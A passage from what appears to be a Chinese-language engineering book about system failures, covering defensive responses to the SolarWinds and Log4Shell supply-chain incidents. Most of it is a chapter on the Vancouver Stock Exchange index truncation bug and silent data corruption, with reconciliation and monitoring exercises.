那個週末為例：很多團隊的對帳會是——觸發是「一個被記錄的字串」（F12，而且是你最不設防的動作）；F14 命中得很慘（全公司一堆服務都間接依賴 Log4j，一個漏洞全中）；F3 體現在「我們的輸入驗證、WAF、權限控制，沒有任何一層是針對『log 動作會執行程式碼』設計的」；F8 體現在「這個危險設計早就在那裡，只是沒人意識到能武器化」。對帳的關鍵收穫通常是那個刺痛的問題：**「那個週末，我們花了多久才回答出『我們到底有沒有用、用在哪』？」**——如果答案是「好幾天、靠人肉 grep」，那暴露的就是 SBOM 與依賴盤點的缺口。能把一次依賴事故講成「哪幾層信任都只驗來源、哪個盲點被對齊」，而不是「就是 X 套件爛」，這題就過了。\n\n### 推演題4 **[25 分鐘]** ★★（設計題）\n\n你要降低你一個 Node／TypeScript 服務的供應鏈爆炸半徑。請設計**三道**防線，分別對應「SolarWinds 型（合法管道散布的毒）」與「Log4Shell 型（無害動作藏執行路徑）」，並說清楚每一道擋住的是哪一段、它的代價是什麼。\n\n#### 推演解答\n\n一個合理的三道防線（深度防禦，對應兩種形狀）：\n\n1. **鎖死＋盤點：嚴格 `npm ci` + lockfile + SBOM + 自動升版要人眼複核**（主擋 SolarWinds 型的入口、並為 Log4Shell 型提供盤點能力）。CI 一律 `npm ci`（完全照 lockfile，拒絕自作主張升版）；產出並保存 SBOM，讓你能在下一個 Log4Shell 來時 30 分鐘內回答「我有沒有用、用在哪」；Dependabot/Renovate 的 PR **不自動 merge**，至少 patch 以上要有人看一眼 diff（尤其留意 install script 的變動）。代價：升版變慢、多一點人工。但這道直接打掉「壞更新順著自動化無聲進來」的路徑。\n2. **最小權限 + egress 管制**（限制兩種形狀「萬一中了」的傷害）。CI runner 與 runtime 用最小權限的角色（短期 credential、scoped IAM）；對外網路出口做白名單——你的服務真的需要能對任意外部位址發連線嗎？如果一個被投毒的 install script 想外傳 secrets、或一個被利用的依賴想連 LDAP 抓 class，egress 白名單就是攔住「資料被帶走／惡意 class 被抓回」的那道牆。代價：白名單要維護、偶爾擋到合法需求要加例外。這是把爆炸半徑從「全盤淪陷」壓到「進來了但帶不走、跑不了下一步」（接 ch22 的「安全地壞」）。\n3. **build provenance／可重現建置 + 自動更新的 agent 也要 canary**（往源頭推信任、並馴服「會自動更新的高權限 agent」）。對自己的 artifact 建立來源證明（哪份 commit、哪個環境建的）；對你跑的監控/安全 agent，不要讓它「一更新就全機隊同步生效」——比照 CrowdStrike 的教訓（見 ch13），讓它的更新也走 canary／分批。代價：provenance 工具鏈有導入成本、agent 分批會讓「防護更新」生效慢一點（這是個真實取捨，和 Cloudflare 繞過分階段發布是同一類權衡，見 ch10）。\n\n排序原則：(1) 是地基（沒有盤點與鎖定，後面都是空談，且性價比最高）；(2) 是兜底（假設防線會被穿，限制傷害——這是焦慮工程師的核心信念：不是「不會中」，是「中了也帶不走」）；(3) 是把信任往源頭推的進階手段。三道分別對應「不讓毒無聲進來／中了也限制傷害／把信任根驗到內容層」——任一單獨都不夠，疊起來才是供應鏈版的瑞士起司正面用法（見 ch22）。\n\n## 自我檢核\n\n口頭自答，講得出來才算過關：\n\n1. 為什麼說 SolarWinds「不是 Orion 有漏洞被駭」？攻擊面到底在哪裡（產品 vs 生產線）？這個區別為什麼是本案最重要的教訓？\n2. 程式碼簽章「證明了什麼、沒證明什麼」？為什麼 SolarWinds 的後門能帶著合法簽章、走官方通道，一路通過下游每一道驗證？\n3. 「18,000 家公司被駭」這句話哪裡不精確？18,000 是什麼數字、實際被深入入侵的約有多少、這個差別說明了攻擊者的什麼意圖？\n4. Log4Shell 的核心，是哪三個「各自合理」的設計疊在一起？為什麼「把一個字串寫進 log」會變成遠端程式碼執行？「資料/程式碼界線崩潰」在這裡具體指什麼？\n5. 為什麼「升級 Log4j 就好了」這句話，難的是前半句而不是後半句？這跟 SBOM 與遞移依賴有什麼關係？\n6. 把 SolarWinds 與 Log4Shell 放在一起：它們命中 F12、F3、F14、F8 各是怎麼體現的？為什麼說兩案的觸發都是「你最不設防的日常動作」？\n7. 把這一章接回 ch19（見 ch19）：Heartbleed 的「沒人有資源顧」與本章的「被刻意下毒／藏著武器化能力」，差別在哪？為什麼兩者都指向「先知道你依賴了什麼」這同一個動作？\n8. 在你自己的系統裡，「一個來源可信、有官方簽章的更新內容應該安全」這個假設，藏在哪幾個具體的地方（CI 安裝方式、自動升版、會自動更新的 agent）？哪一個最可能先咬到你？\n\n## 延伸閱讀\n\n- **CISA 緊急指令 ED 21-01**：*Mitigate SolarWinds Orion Code Compromise*（2020-12-13）。<https://www.cisa.gov/news-events/directives/ed-21-01-mitigate-solarwinds-orion-code-compromise> — 一手的官方應變文件，讓你看到一個國家級的事件應變第一反應是「立刻把它斷網下線」，以及為什麼。\n- **Mandiant/FireEye 技術分析**：*Highly Evasive Attacker Leverages SolarWinds Supply Chain Compromises with SUNBURST Backdoor*。<https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor> — 揭露者本人的拆解，看 SUNBURST 怎麼潛伏、避沙箱、擬態 C2，理解「為什麼自動偵測抓不到」。\n- **CrowdStrike SUNSPOT 分析**：*SUNSPOT: An Implant in the Build Process*。<https://www.crowdstrike.com/en-us/blog/sunspot-malware-technical-analysis/> — 專講編譯期注入的那把工具，本章「後門不在程式裡、在做出程式的那台機器裡」這句話的技術出處。\n- **CSRB Log4j 報告**：Cyber Safety Review Board, *Review of the December 2021 Log4j Event*（2022-07）。<https://www.cisa.gov/resources-tools/resources/cyber-safety-review-board-csrb-report-log4j> — 美國官方對 Log4Shell 的權威覆盤，「endemic」這個讓人不安的結論與 SBOM 治理缺口的呼籲都出自這裡。\n- **NVD CVE-2021-44228**：<https://nvd.nist.gov/vuln/detail/CVE-2021-44228> — Log4Shell 的權威漏洞紀錄，CVSS 10.0 的官方評分與受影響版本範圍（2.0-beta9 至 2.14.1）。\n- **SLSA 框架**：*Supply-chain Levels for Software Artifacts*。<https://slsa.dev/> — 本章設計題提到的「build provenance」的業界框架；想把「信任從來源推到內容」落地，從這裡開始看。\n"}, {"id": "ch21-silent-corruption", "file": "ch21-silent-corruption.md", "group": "Part VI — 看不見的縫：安全、供應鏈與靜默損毀", "title": "ch21 — 靜默的錯誤：當監控全綠，數字卻在悄悄漂走", "md": "# ch21 — 靜默的錯誤：當監控全綠，數字卻在悄悄漂走\n\n> **本章解剖什麼**：到目前為止，本書的每一場災難都會「叫」。火箭解體、飛機墜海、電網全黑、伺服器藍屏、整個網際網路停下來——它們的共通點是**事發那一刻你一定知道**，因為東西明顯壞了、警報明顯響了、有人被吵醒了。這一章是全書唯一的例外：一場**從頭到尾沒有觸發任何警報**的災難。溫哥華證券交易所的指數，在 1982 到 1983 年間，每天被「正確地」算出來、印出來、報給市場，沒有崩潰、沒有報錯、沒有不連續——而它顯示的數字，在約 22 個月裡，默默地漂到了真值的一半。沒有人被吵醒，因為**沒有任何一個自動化機制，曾經在問「這個數字對不對」**。它們只問「有沒有一個數字」。主打 **F8**（潛伏條件 vs 觸發——這裡的潛伏期由「沒人盯偏差」一手撐起，而且根本沒有戲劇性的觸發那一刻）、**F11**（監控盲區——監控全綠，因為它監控的是「服務有沒有在跑、有沒有產出數字」，不是「數字是不是對的」）、**F9**（表示／假設的縫——truncation 與 rounding 之間那道沒人注意的縫）；尾巴帶到 **F3**（缺乏獨立對拍這層起司根本不存在）。它跟 ch16 三哩島是孿生：那盞燈顯示「閥門收到關閉指令」而非「閥門真的關了」，是顯示**意圖**而非**現實**；這裡的監控顯示「有沒有數字」而非「數字對不對」——同一個觀測性的謊言，換了一張臉。\n\n## 從你已知的出發\n\n先講一件你大概從來沒被它吵醒過、所以也從來沒真正怕過的事。\n\n你的所有監控——CloudWatch 的 alarm、你自建的那條 FluentBit+Lua pipeline、k8s 上每個 Deployment 的 health probe——回答的是一組**活著沒有**的問題：服務有回 200 嗎？P99 延遲爆了嗎？錯誤率過閾值了嗎？佇列堆積了嗎？CPU 打滿了嗎？這些很重要，你也調校得很好（那次尖峰 RDS CPU 降 40%，靠的就是你看得懂這些訊號）。但它們有一個**共同的形狀**：問的全是「**這台機器、這個服務、這條路徑，還在不在動**」。\n\n它們**沒有**一個在問：**「它吐出來的那個數字，是對的嗎？」**\n\n你那條結算 pipeline——K8s CronJob 觸發、丟進 SQS、一個冪等消費者跨服務做最終一致的結算——它的監控是這樣的：CronJob 按時跑了嗎？SQS 有積壓嗎？消費者有報錯嗎？DLQ 有東西嗎？這些全綠你就安心了。但你有沒有一個 job，每天結束時把「我這條 pipeline 算出來的總額」拿去跟「另一個獨立來源（帳務、上游真實成交、成分資料的直接加總）」**對一遍**？\n\n大部分系統沒有。因為對帳麻煩、要寫第二套邏輯、而且**平常永遠對得上**——所以「應該沒事吧」。你那句「應該沒事吧」的完整版，這一章要把它寫出來、再拆穿：\n\n> **「監控全綠，代表系統正常運作，代表它算出來的資料是對的。」**\n\n這句話裡藏了一個悄悄的等號：**「系統在運作」＝「資料是對的」**。這一章就是一個把這個等號撐到斷掉的故事。它沒死人、沒燒錢燒到上新聞、沒讓任何服務宕機——正因為如此，它是全書最讓焦慮工程師背脊發涼的一個，因為它示範了一種你的監控**結構上看不見**的失敗：liveness 全綠，correctness 早就崩了，而這兩者之間，你從來沒架過一座橋。\n\n## 冷開場：那個跳了一倍的早晨\n\n1983 年 11 月 28 日，星期一早上，溫哥華證券交易所開盤。\n\n它的指數，前一個星期五（11 月 25 日）收盤時停在 **524.881**。這數字本身毫無異狀——三位小數、看起來精確、和前一天連續、和市場情緒大致吻合。過去快兩年，這個指數每天都是這樣：開盤、隨成交一路跳動、收盤，數字平滑、連續、合理。\n\n然後這個星期一早上，它開在 **1098.892**。\n\n幾乎是星期五收盤的**兩倍**。\n\n一夜之間，一個股票指數翻了一倍。如果你只看數字，會以為發生了某種荒謬的事。但真相比那更讓人不安，而且這個不安正是這一章的核心：\n\n**那個一夜翻倍的跳動，不是錯誤。它是修正。**\n\n過去快兩年裡每天平滑、連續、看起來無比正常的那些數字，才是錯的。星期一早上那個突兀、不連續、看起來像出了大事的 1098.892，反而是**第一個對的數字**。市場沒有暴漲，它一直都在它該在的地方。是**那把用來量市場的尺，悄悄地、每天一點點地，量錯了快兩年**——而修好那把尺的那一刻，因為要把累積的偏差一次補回來，看起來就像一場暴漲。\n\n停下來體會這個錯位：一個系統連續快兩年每天產出看似正常的數字、所有人都信它，而它「終於正確」的那一刻反而看起來像故障。**正常的外觀，是這場災難的偽裝；不連續的修正，才是真相露出來的瞬間。**\n\n## 裝填：一行用錯的函式，加上一個沒人盯的量\n\n要看懂這件事，得先知道指數是怎麼算出來的、那道縫藏在哪裡。\n\nVSE 的這個指數在 1982 年 1 月設立，基值定為 **1000.000**——三位小數。它是一個交易所綜合指數，隨成分股的每一筆成交而重新計算：每當有股票成交、價格變動，程式就拿新的市值資料重算一次指數值。\n\n這個「重算」有多頻繁？依多個來源整理，**一個交易日大約重算 2,800 到 3,000 次**——指數一天之內被計算上千次，每一次都基於前一次的結果往前推。\n\n縫就藏在「每一次重算，取到小數第三位」這個動作裡。取到三位小數，有兩種做法：\n\n- **rounding（四捨五入，`round()`）**：540.325**67** → 540.32**6**。多的部分大於等於 0.0005 就進位、否則捨去。\n- **truncation（截斷，`floor()`）**：540.325**67** → 540.32**5**。不管後面是多少，**一律直接砍掉**。\n\nVSE 的程式在這一步**用了 `floor()`，而不是 `round()`**。技術上，這就是「一行用錯了函式」。從一次單獨的計算看，這個錯誤**小到不可能被任何人察覺**——單次最多差約 0.0005 點，遠在小數點後第三位，肉眼、報表、任何合理的 sanity check 都不會覺得有問題。每一個數字，單獨看，都是對的。\n\n故事到這裡若停下，這個 bug 永遠不會釀災——它會躺在那裡，無害。讓它變成災難的，是另外兩個各自無害的條件，恰好疊在 `floor()` 上面。\n\n**潛伏條件一：誤差是單向的。** 這是整件事的關鍵，也是最常被講錯的地方。`round()` 的誤差是**雙向**的——有時往上、有時往下，長期平均會互相抵消、趨近於零。但 `floor()` **永遠往同一個方向**（往下捨），從不往上，所以誤差不抵消、**只會單向累積**：每一次重算都從一個「已經偏低一點點」的值出發，再砍掉一點點，下一次又從更低的值出發——偏差像複利一樣，**單調地、只往一個方向**長大。\n\n**潛伏條件二：高頻。** 把一個「單次小到看不見、但永遠單向」的誤差，乘以「一天上千次、一年數十萬次」，再讓它**用前一次的結果當下一次的起點**累積——那個小到 0.0005 的誤差，就被放大成每月約 25 點的漂移。\n\n三個條件擺在一起，這場災難的炸藥就裝填完成了：\n\n```\n┌─ floor() 而非 round() ──→ 每次誤差「只往下」（單向，不抵消）\n│\n├─ 一天重算約 2,800–3,000 次 ─→ 高頻\n│\n└─ 用前一次結果推下一次 ───→ 累積（複利式）\n                                    │\n                                    ▼\n              每次小到 0.0005 的誤差 → 每月漂約 25 點 → 22 個月後偏約 485 點\n```\n\n注意：這裡**沒有一個「觸發那一刻」**——沒有稻草、沒有部署、沒有人按錯鍵、沒有感測器壞掉。災難從指數**上線第一天**就開始，每天以同樣速率進行。這正是它和本書其他每一章最不一樣的地方：它的潛伏期不是由「等待一個觸發」決定，而是由「**沒有任何人在盯那個會漂走的量**」決定——它能潛伏多久，純粹取決於多久之後才有人起疑去獨立重算。\n\n## 連鎖：偏差怎麼長到一半，而沒人喊停\n\n一個月約 25 點。聽起來不多，但它每個月都來、而且只往一個方向。第一個月底差約 25 點，沒人會在意，市場本來就會上下波動。半年後差約 150 點，但這半年裡市場本身也在漲跌，**沒有人手上有第二個獨立的數字**能把「市場真實的下跌」和「儀器的系統性偏低」分開。一年後差約 300 點，指數可能顯示在 700 附近——它依然每天連續、平滑地跳動，依然「看起來」是個正常運作的指數。\n\n關鍵的問題不是「為什麼會漂」，而是：**為什麼沒有任何一道防線，在這 22 個月裡的任何一天喊停？** 因為**每一道你會想到的防線，都不是設計來抓這種錯的**。\n\n指數程式本身：**沒報錯。** 它每天都成功執行、產出數字。從 liveness 的角度看，它健康得不得了——從沒當機、沒拋例外、沒回傳 null、沒產生不連續的跳動。VSE 當年若有監控看板，那看板會是**全綠的**：服務正常、每筆成交都成功觸發重算、輸出格式正確、和前值連續。\n\n數字的「合理性」：**通過了。** 這個偏差最陰險的地方是它**慢**——它每天只漂一點點，從不不連續，是**平滑地**漂走的，任何「今天和昨天差太多嗎」的檢查都抓不到。一個突然從 1000 跳到 500 的數字會被質疑；一個花 22 個月、平滑地從 1000 滑到 524 的數字，**看起來和一個真實下跌的市場一模一樣**。\n\n那道唯一能抓到它的防線——**獨立對拍**——根本不存在。沒有人定期用一套**獨立的方法**（比如直接從成分股當前市值、用另一支程式從頭完整重算一次指數）去和那個累積出來的值對照。若有這道防線，哪怕一個月對一次，第一個月就會發現「我獨立重算是 1000、系統顯示 975，差了 25 點，這不對」。但這片起司**整片都不存在**——VSE 從沒架過，因為「指數每天都好好的，為什麼要花力氣去重算驗證？」\n\n於是偏差就這樣長大，沒有任何一天被喊停，直到它大到約 485 點——**指數顯示的值，只剩下它該有的值的一半。**\n\n## 餘波：是「有人起疑」而不是「警報響了」\n\n最後是怎麼被發現的？\n\n不是某個自動化偵測抓到的——那種偵測**結構上不存在**。是**有人起疑**：當偏差大到和市場參與者的直覺、和其他指標對照都不對勁，終於有人去請外部顧問做**獨立的重新計算**——補上了那道從來沒存在過的「獨立對拍」防線。一算之下，指數的「真值」應約在 **1009.811**，而系統顯示的是 **524.881**。\n\n1983 年 11 月 25 日星期五收盤後，bug 被修掉（把 `floor()` 換成正確計算）。下一個交易日 11 月 28 日星期一，指數開在 **1098.892**——把累積快兩年的偏差一次補回來。那個讓所有人愣住的「一夜翻倍」，**整整就是這個 bug 修正的量，一個 cent 都不多**。\n\n這場災難沒有官方事故調查（它不是安全事故，沒死人、沒上新聞），權威整理散見於數值計算的學術討論（McCullough 等人對數值誤差的分析常引此例）與當代報導。但它的教訓比很多死了人的災難還鋒利，可濃縮成後面整章都要回收的一句：\n\n**單向的 round-off 誤差，在高頻重算下會線性累積成巨大的偏差——而「監控正常」這件事，完全看不見它。**\n\n在拆進失敗模式之前，先把三個一定會被講錯的迷思釘死。\n\n| 流行說法 | 為什麼錯 |\n|---|---|\n| 「就是個四捨五入的小誤差嘛」 | 錯在重點。重點**不是「誤差小」**——重點是「**單向＋高頻累積**」。如果用的是 `round()`（雙向），誤差會上下抵消、長期趨近零，這個 bug 永遠不會釀災。是 `floor()`（單向）讓誤差**只往一個方向**漂、永不抵消，才把 0.0005 放大成 485 點。把它講成「就是個小數點誤差」，等於沒看懂它。 |\n| 「溫哥華市場真的崩了一半」 | 錯。市值、成分股、真實成交——**從頭到尾沒事**。崩的不是市場，是**指數這把量市場的尺**。真實世界好好的，是儀表默默讀錯了。這正是「靜默資料損毀」的本質：**壞掉的是你對世界的量測，不是世界。** |\n| 「這種事很快就會被發現吧」 | 錯。它潛伏了約 **22 個月**。沒有警報、沒有崩潰、沒有任何一天的數字看起來離譜——只能靠**有人起疑、去做獨立重算**才會浮現。它能潛伏這麼久，正因為它從不做任何會觸發警報的吵鬧行為。 |\n\n## 故障解剖\n\n### 潛伏 vs 觸發\n\n這是本書唯一一章，「觸發」那一欄你會寫不太出東西——而那正是重點。\n\n| | 潛伏條件（早就裝填好的） | 觸發（最後一根稻草） |\n|---|---|---|\n| **VSE 指數** | `floor()` 而非 `round()`（單向誤差）＋ 一天重算約 2,800–3,000 次（高頻）＋ 用前次結果推下次（累積）＋ **從不做獨立對拍**（沒人盯偏差這個量） | **沒有。** 沒有那一刻、那根稻草、那個按錯的鍵。「觸發」這概念在這裡不適用——潛伏期由「沒人盯偏差」決定，不是由「等一個觸發」決定。 |\n\n對比一下本書其他災難，這一點會更刺眼。三哩島有一個卡開的釋壓閥；Schiaparelli 有一個飽和到溢出的高度讀數；它們都有「災難開始的那一刻」。VSE **沒有**。如果你照 ch02（見 ch02）那種「往回找根因、找那個觸發時刻」的習慣去查 VSE，你會撲空——因為它的災難不是「裝填好等觸發」，而是「**一個單向偏差，從第一天起就在那裡漏，只是沒人量它漏了多少**」。F8 在這裡被推到了極端：**潛伏條件，就是全部。**\n\n### 起司的孔洞\n\n| 防線（本該擋住的層） | 為什麼沒擋住 |\n|---|---|\n| 程式不報錯、服務不當機（liveness 監控） | 它運作得**完美**——每天成功執行、產出格式正確、和前值連續的數字。liveness 監控全綠，因為它監控的是「有沒有在跑、有沒有產出」，不是「產出的對不對」（F11）。 |\n| 數字的合理性／不連續性檢查 | 偏差**太慢、太平滑**——每天只漂一點點，從不跳變。任何「和昨天差太多嗎」的檢查都抓不到一個花 22 個月平滑漂走的值；它看起來和真實下跌的市場無法區分（F9：精確的三位小數外觀，掩蓋了系統性偏差）。 |\n| 單向誤差的自我修正 | **不存在**——因為用的是 `floor()`。若用 `round()`，誤差會雙向抵消、長期趨近零，這道「數學上的自我修正」會自動擋住。選了 `floor()`，等於把這道防線拆了（F8）。 |\n| 獨立對拍／重算驗證 | **這片起司整片都不存在。** VSE 從沒架過「用獨立方法定期重算、與顯示值對照」的機制——因為沒人想到要架，因為「它每天都好好的」（F3：缺乏交叉驗證這一層防禦，根本沒被建出來）。 |\n\n這張表在反駁的，是一個比「單一根因」更隱蔽的衝動：把這件事歸結為「**一行 `floor()` 寫錯了**」。那一行確實是技術起點，但它只在其他三個條件都成立時才致命——單向、高頻累積、且沒有任何獨立對拍。把 `floor()` 換成 `round()` 能修這個 bug，**但真正的系統性教訓**是：一個會被高頻使用、會累積的數字管線，**沒有任何一層在驗證它的正確性**。即使你這次用對了 `round()`，下一個會單向漂的東西（計數器、餘額、副本）出現時，你依然沒有那道對拍防線。問題不是「誰寫了 `floor()`」，是「**為什麼這個系統，從來沒有一個機制在問『這個數字對不對』**」。\n\n### 對應模式\n\n- **F8（潛伏條件 vs 觸發）**：被推到極端。災難從第一天起就在漏，沒有戲劇性的觸發那一刻；潛伏期**完全**由「沒人盯偏差」決定。這是全書最純粹的「潛伏條件就是全部」的案例——你找不到那根稻草，因為根本沒有稻草。\n- **F11（監控盲區——該叫的警報沒叫）**：本章主軸，但和其他章的 F11 不一樣：三哩島、2003 大停電是「警報**被淹沒**或**失效**」；VSE 更狠——**警報從一開始就不存在，因為沒人定義過它**。監控全綠不是因為警報壞了，是因為整套監控問的全是「有沒有數字」（liveness），**沒有一個在問「數字對不對」（correctness）**。這是觀測性盲區裡最深的一種：你監控得很好，只是監控的是錯的維度。\n- **F9（介面與假設的縫）**：`truncation` vs `rounding` 之間那道縫。寫程式的人對「取到三位小數」的假設（截斷就好），和指數計算的數學要求（必須四捨五入才能讓誤差雙向抵消）之間，有一道沒人注意到的縫。表面上兩者都「取到三位小數」、看似等價；實際上一個讓誤差抵消、一個讓誤差累積——這道縫，正是災難的入口。\n\n### 一句話形狀\n\n**這場災難的形狀是**：一個量測世界的數字管線，因為一行 `floor()`（而非 `round()`）讓每次計算都帶一個**單向**的微小誤差，又因為一天重算上千次、且用前次結果推下次而**高頻累積**；它從上線第一天起就在漂，卻**沒有任何一層在驗證它的正確性**——所有監控都只確認「服務在跑、有數字產出」，沒有一個在問「數字對不對」——於是偏差在監控全綠的情況下，靜默地長了約 22 個月，直到顯示值只剩真值的一半；而修好它的那一刻，因為要一次補回累積的偏差，反而看起來像一場暴漲。**壞的從來不是世界，是你對世界的量測；而你的監控，結構上看不見這種壞。**\n\n## 換成你的系統\n\n這一章是全書離你最近、也最該讓你睡不著的一章。前面那些火箭、飛機、核電廠，你還能用「那是另一個領域」安慰自己。但**靜默資料損毀，是你世界的原生居民**——而且你的監控，大概率和 VSE 當年一樣，結構上看不見它。\n\n**先把你那句「應該沒事吧」原封不動地擺出來**：\n\n> **「我的監控全綠，所以系統正常運作，所以它算出來/存下來/同步出去的資料是對的。」**\n\n這句話的斷裂點，就是那個悄悄的等號：**「系統在運作」≠「資料是對的」。** 你的 liveness 監控（health probe、錯誤率、延遲、佇列深度）回答的是前者，**結構上**回答不了後者。VSE 的指數服務從沒當機、從沒報錯、健康得很——它只是一直在算錯。下面是這個錯誤形狀藏在你系統裡的幾個化身。\n\n**化身一：單向漂移的計數器／餘額。** VSE 的直系後代。你有沒有一個會被高頻更新、且每次更新都基於前值的數字——用量計數、餘額、庫存、累積 metric？只要它的更新邏輯裡有任何**單向**的小偏差（一個邊界條件每次少算一點、一個 retry 在某情況重複計一次、一個浮點累加的捨入），它就會像 VSE 一樣**單向漂**。而你的監控——「這個 counter 服務在跑嗎」——全綠。你天天看那個數字，它平滑、合理，因為每天只偏一點點，等你發現時它已偏了三個月。**雙向誤差會自我抵消、不用太怕；單向誤差會累積，它才是這一章真正的主角。**\n\n**化身二：split-brain——兩個叢集都「健康」，狀態卻在分岔。** VSE 形狀在分散式系統裡最危險的變體。網路分區時，若容錯設計有縫，可能出現兩個節點/叢集**各自都認為自己是 primary、各自都接受寫入**。兩邊的 liveness 監控都全綠——都在回 200、都沒報錯，因為從各自視角一切正常。但同一個 key，A 邊寫成 X、B 邊寫成 Y，狀態**正在悄悄分岔**。等分區癒合要 merge 時，你才發現你有兩個互相矛盾的「真相」，而且很可能已有一邊的寫入建立在另一邊看不到的狀態上。這是 VSE 在有狀態系統裡**爆炸半徑最大**的版本。\n\n**化身三：最終一致性下的副本分歧（replication divergence）。** 這個直接戳中你的世界。你習慣最終一致性——副本短暫不一致、然後**收斂**；「最終一致」的隱含承諾就是「最終會收斂」。但萬一某個邊界情況讓它們**不收斂**呢？衝突解決邏輯有 bug、一個事件在某路徑被漏掉、冪等鍵在某種重試下沒擋住——副本就會**靜默且永久地**分岔。而你監控的是 replication lag，那是個 liveness 指標——它告訴你「副本落後幾秒」，**不告訴你「副本內容對不對」**。lag 是 0，只代表「沒有積壓」，不代表「內容一致」。VSE 教你的正是這個：**「沒有積壓」和「內容正確」是兩個完全不同的問題，而你只監控了前一個。**\n\n**化身四：純粹的 bit rot／silent data corruption。** 最底層的版本：磁碟上一個 bit 因硬體老化悄悄翻轉、一次沒被 checksum 保護的傳輸把資料改了一位、一個快取層回了一份半損的值。沒有任何一層報錯——資料**讀得出來**，只是**錯了**，你的服務開開心心地把它端出去。\n\n這四個化身骨架完全一樣：**liveness 全綠，correctness 早已崩壞，而你從沒在這兩者之間架過橋。** 焦慮工程師到這裡該問的，不是「我的服務還活著嗎」（那個你天天在看），而是那個你從沒問過的問題：**「我憑什麼相信它存下來/算出來/同步出去的資料是對的？我有沒有一個獨立的東西在驗證這件事？」**\n\n可操作的自問，別只記「要小心」：\n\n1. **我有沒有任何一個「對帳（reconciliation）」job？** 拿你某條關鍵管線的輸出，用一個**獨立的方法/獨立資料來源**重算一遍、對照差異——哪怕一天一次。你那條結算 pipeline 的總額，有沒有每天去跟一個獨立的真相（帳務、上游成交）對一次？這就是 VSE 最後靠外部顧問補上的那道防線。**沒有對帳，你就是 1983 年的 VSE。**\n2. **我的關鍵資料有沒有 checksum/hash？** 寫進去、傳出去、從快取拿出來的東西，有沒有一個校驗值能讓你發現「它被悄悄改了一位」？bit rot 和半損的快取值，只有 checksum 抓得到，liveness 監控永遠抓不到。\n3. **我有沒有 end-to-end 的不變式（invariant）在被檢查？** 不只「服務活著」，而是「**這個系統的某個性質，恆為真**」——所有帳戶餘額加總等於某個守恆量、進去的事件數等於出來的、某個比率永遠落在某區間。這就是把「資料對不對」翻譯成一條可以被自動檢查的 safety property（你書架上的 TLA+ 書講的正是 invariant；這裡不展開）。一條被持續檢查的不變式，就是一個會在「數字開始漂」時真的叫你的警報——VSE 缺的就是它。\n4. **我怎麼防 split-brain？** 我的容錯設計裡，有沒有 quorum（多數決，讓少數派那一邊無法獨自接受寫入）＋ fencing（隔離舊 primary，讓被取代的節點無法再寫）？如果一個被網路分區隔開的舊 primary 還在傻傻接受寫入，誰擋它？這是 VSE 化身二的解方——用 quorum 與 fencing，從結構上不讓「兩個都健康卻在分岔」發生。\n5. **最關鍵的一條——我的監控，到底在監控哪個維度？** 把你所有的 alarm 列出來，逐一問：這條是在問「**有沒有 / 活著沒有**」（liveness），還是「**對不對**」（correctness）？我打賭你會發現幾乎全部都是前者。這不是說 liveness 監控沒用——它很有用。是說你少了一整個維度，而那個維度裡藏著本書唯一不會吵醒你的失敗。\n\n最後一個橋接，回到 ch16（見 ch16）：三哩島那盞燈顯示「閥門收到了關閉**指令**」而非「閥門**真的關了**」——它顯示**意圖**、不顯示**現實**。你的監控全綠，顯示的是「服務**在產出數字**」而非「數字**是對的**」——它顯示**有沒有**、不顯示**對不對**。這是同一個觀測性謊言的孿生兄弟：你以為在看現實，其實在看一個**代理指標（proxy）**，而代理和現實之間的縫，正是災難住的地方。再對照 ch08（見 ch08）：Schiaparelli 也是一個壞數字沒有合理性檢查——但那個壞數字讓著陸器**立刻墜毀**、吵得驚天動地；VSE 的壞數字**默默漂了 22 個月**、安靜得沒人發現。同一個「壞數字」，一個緊耦合直通、瞬間爆炸，一個鬆散累積、靜默腐蝕。本書到此教你怕的都是前者；這一章要你開始怕後者。\n\n而這些解方——對帳、checksum、end-to-end 不變式、quorum＋fencing——它們的共通點，是把「**安全地壞**」的精神從「服務層」往下推到「資料層」：不是讓資料永遠不壞（你做不到），是讓資料**壞的時候你會知道**。這正是下一章（見 ch22）韌性工程要把它系統化的東西。\n\n## 紙上推演\n\n### 推演題1 **[15 分鐘]** ★★\n\n口頭（或寫給另一個工程師）講清楚：為什麼把 `floor()` 換成 `round()` 就能根治 VSE 的 bug？關鍵**不是**「`round()` 比較精確」——而是別的。請說出那個真正的關鍵，並解釋「如果一開始就用 `round()`，這個 bug 會不會釀災」。\n\n#### 推演解答\n\n關鍵是**方向性**，不是精確度。`round()` 和 `floor()` 的單次誤差量級其實差不多（都在小數點後第三位之外）——差別在於 `round()` 的誤差是**雙向**的（有時往上、有時往下），長期平均下來會互相抵消、期望值趨近於零；而 `floor()` 的誤差**永遠單向**（只往下），所以不抵消、只累積。\n\n所以如果 VSE 一開始就用 `round()`，這個 bug **不會釀災**——即使一天重算 3,000 次、累積 22 個月，雙向誤差會正負相消，指數會在真值附近做極小的隨機游走、永遠不會系統性漂走。**讓這件事致命的不是「有誤差」，是「誤差只往一個方向」；高頻只是放大器——它放大的是「單向」這個性質。** 能講清楚這一點，這題就過了。\n\n### 推演題2 **[15 分鐘]** ★★\n\nVSE 的監控（假設它有）會是全綠的。請說清楚：那套監控**在問什麼問題**？它**漏問了什麼問題**？用「liveness vs correctness」的語言，解釋為什麼「監控全綠」和「數字是對的」是兩件**結構上**不同的事，而不只是「監控做得不夠細」。\n\n#### 推演解答\n\nVSE 的監控（以及你大部分的監控）問的是 **liveness 類**問題：服務在跑嗎？有按時產出數字嗎？格式對嗎？和前值連續嗎？有報錯嗎？共通形狀是「**這東西還在動嗎**」。它漏問的是 **correctness 類**問題：產出的這個數字，**和它應該是的值一致嗎**？而這個問題**無法**從 liveness 訊號推導——一個服務可以完美運轉、同時穩定地產出錯誤的數字（VSE 就是活生生的例子）。\n\n重點是：這**不是「監控不夠細」**——你把 liveness 監控做到再細（更多 metric、更短取樣、更嚴閾值），也永遠抓不到 correctness 問題，因為它們是**正交的維度**。要監控 correctness 得靠**另一套東西**：一個獨立真相來源去對照（對帳）、或一條恆為真的不變式去檢查。VSE 的悲劇不是「監控不夠靈敏」，是「**整個 correctness 維度根本沒被監控**」。能講出這個正交性，這題就過了。\n\n### 推演題3 **[25 分鐘]** ★★★（對帳）\n\n把你維運過、或聽過的一次**靜默**資料問題，對應到本章的 F 模式。挑一個「監控全綠、但資料其實錯了/分岔了」的真實案例：一次副本不收斂、一次計數器漂掉、一次快取回了髒值、一次 split-brain、一次某個彙總數字後來發現一直偏一邊。逐項問：它是單向漂移還是雙向？liveness 